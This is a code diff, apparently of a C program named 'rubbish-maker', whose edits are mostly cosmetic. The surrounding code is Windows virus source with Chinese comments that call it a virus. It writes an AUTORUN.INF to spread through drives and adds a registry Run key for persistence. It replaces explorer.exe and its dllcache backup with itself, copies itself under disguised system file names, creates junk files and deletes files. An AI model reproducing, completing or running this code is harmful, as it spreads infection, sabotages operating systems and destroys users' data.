@@ -1,5 +1,5 @@
 /**
- * basic 1
+ * rubbish-maker
  * @author unknown
  */
 
@@ -12,7 +12,7 @@
 #define SVCHOST_NUM 6     /* 关键位置病毒复制数量 */
 #define RUBBISH_NUM 5     /* 垃圾文件数量 */
 #define REMOVE_NUM 5      /* 删除文件数 */ 
-/*====================================================================*/
+
 /*
   文件AUTORUN.INF内容：
   1.自动运行SVCHOST.com
@@ -20,27 +20,27 @@
   3.覆盖默认资源管理器命令，使病毒体作为新的命令方式
 */ 
 char *autorun={"[AutoRun]\nopen=\"SVCHOST.com /s\"\nshell\\open=打开(&O)\nshell\\open\\Command=\"SVCHOST.com /s\"\nshell\\explore=资源管理器(&X)\nshell\\explore\\Command=\"SVCHOST.com /s\""};
-/*=====================================================================*/
+
 /*
   添加注册表项：
   1.自动运行生成病毒体 C:\windows\wjview32.com
 */
 char *regadd={"REGEDIT4\n\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run]\n\"wjview32\"=\"C:\\\\windows\\\\wjview32.com /s\""};
-/*=====================================================================*/
+
 /**
  * 复制文件
  * @param {*} 复制源
  * @param {*} 目的地
  * @return 成功返回0，失败返回1
-*/ 
+ */ 
 int copy (char *infile, char *outfile)
 {
   FILE *input, *output;
   char temp;
 
-  if(strcmp(infile,outfile) != 0 && ((input = fopen(infile,"rb")) != NULL) && ((output = fopen(outfile,"wb")) != NULL))
+  if (strcmp(infile,outfile) != 0 && ((input = fopen(infile,"rb")) != NULL) && ((output = fopen(outfile,"wb")) != NULL))
   {
-    while(!feof(input))
+    while (!feof(input))
     {
       fread(&temp, 1, 1, input);
       fwrite(&temp, 1, 1, output);
@@ -53,15 +53,14 @@ int copy (char *infile, char *outfile)
   else return 1;
 }
 
-/*=====================================================================*/
 /**
  * 通过explorer自动运行 
- * @return 成功返回0，失败返回1, 2
+ * @return {int} 成功返回0;失败返回1,2
  */ 
 int autorun_explorer ()
 {
   FILE *input;
-  if((input=fopen("c:\\windows\\system\\explorer.exe","rb"))!=NULL)
+  if((input=fopen("c:\\windows\\system\\explorer.exe", "rb"))!=NULL)
   {
     fclose(input);
     remove("c:\\windows\\$temp$");
@@ -71,31 +70,29 @@ int autorun_explorer ()
 
   copy("c:\\windows\\explorer.exe","c:\\windows\\system\\explorer.exe");
   rename("c:\\windows\\explorer.exe","c:\\windows\\$temp$");
-  rename("c:\\windows\\system32\\dllcache\\explorer.exe","c:\\windows\\system32\\dllcache\\$temp$");
+  rename("c:\\windows\\system32\\dllcache\\explorer.exe", "c:\\windows\\system32\\dllcache\\$temp$");
   
-  if(copy("SVCHOST.com","c:\\windows\\explorer.exe")==0 && copy("SVCHOST.com","c:\\windows\\system32\\dllcache\\explorer.exe")==0)
+  if(copy("SVCHOST.com","c:\\windows\\explorer.exe") == 0 && copy("SVCHOST.com","c:\\windows\\system32\\dllcache\\explorer.exe")==0)
     return 0;
   else
     return 2;
 }
 
-/*=====================================================================*/
 /**
  * 添加注册表项 
- * @return 成功返回0，失败返回1
+ * @return {int} 成功返回0;失败返回1,2
  */ 
 int add_reg ()
 {
   FILE *output;
-  if((output=fopen("$$$$$","w"))!=NULL)
+  if((output=fopen("$$$$$", "w"))!=NULL)
   {
     fprintf(output,regadd);
     fclose(output);
-    spawnl(1,"c:\\windows\\regedit.exe"," /s $$$$$",NULL);
+    spawnl(1,"c:\\windows\\regedit.exe"," /s $$$$$", NULL);
   }
 }
 
-/*=====================================================================*/
 /**
  * 复制病毒 + Autorun.inf自动运行 
  * @return none
@@ -104,10 +101,10 @@ void copy_virus ()
 {
   int i,k;
   FILE *input, *output;
-  char *files_svchost[SVCHOST_NUM]={"svchost.com","c:\\windows\\wjview32.com","c:\\windows\\system\\MSMOUSE.DLL","c:\\windows\\system32\\cmdsys.sys","c:\\windows\\system32\\mstsc32.exe","c:\\windows\\explorer.exe"};
-  char temp[2][20]={"c:\\svchost.com","c:\\autorun.inf"};
+  char *files_svchost[SVCHOST_NUM] = {"svchost.com","c:\\windows\\wjview32.com","c:\\windows\\system\\MSMOUSE.DLL","c:\\windows\\system32\\cmdsys.sys","c:\\windows\\system32\\mstsc32.exe","c:\\windows\\explorer.exe"};
+  char temp[2][20] = {"c:\\svchost.com","c:\\autorun.inf"};
   
-  for(i=0;i<SVCHOST_NUM;i++)
+  for(i = 0; i< SVCHOST_NUM; i ++)
   { 
     if((input=fopen(files_svchost[i],"rb"))!=NULL)
     {
@@ -120,7 +117,7 @@ void copy_virus ()
     }
   }
 
-  for(i=0;i<SVCHOST_NUM;i++)
+  for(i = 0; i < SVCHOST_NUM; i ++)
   {
     if((input=fopen(files_svchost[i],"rb"))!=NULL)
     {
@@ -190,7 +187,6 @@ void remove_files ()
   }
 }
 
-/*=====================================================================*/
 /**
  * 主程序
  * @return none
@@ -203,7 +199,7 @@ int main (int argc, char **argv)
   spawnl(1, "c:\\windows\\system\\explorer.exe", NULL);
 
   if (argc > 1) {
-    if (strcmp(argv[1],"/s") == 0) {
+    if (strcmp(argv[1], "/s") == 0) {
       add_reg();
       copy_virus();
       make_rubbish();
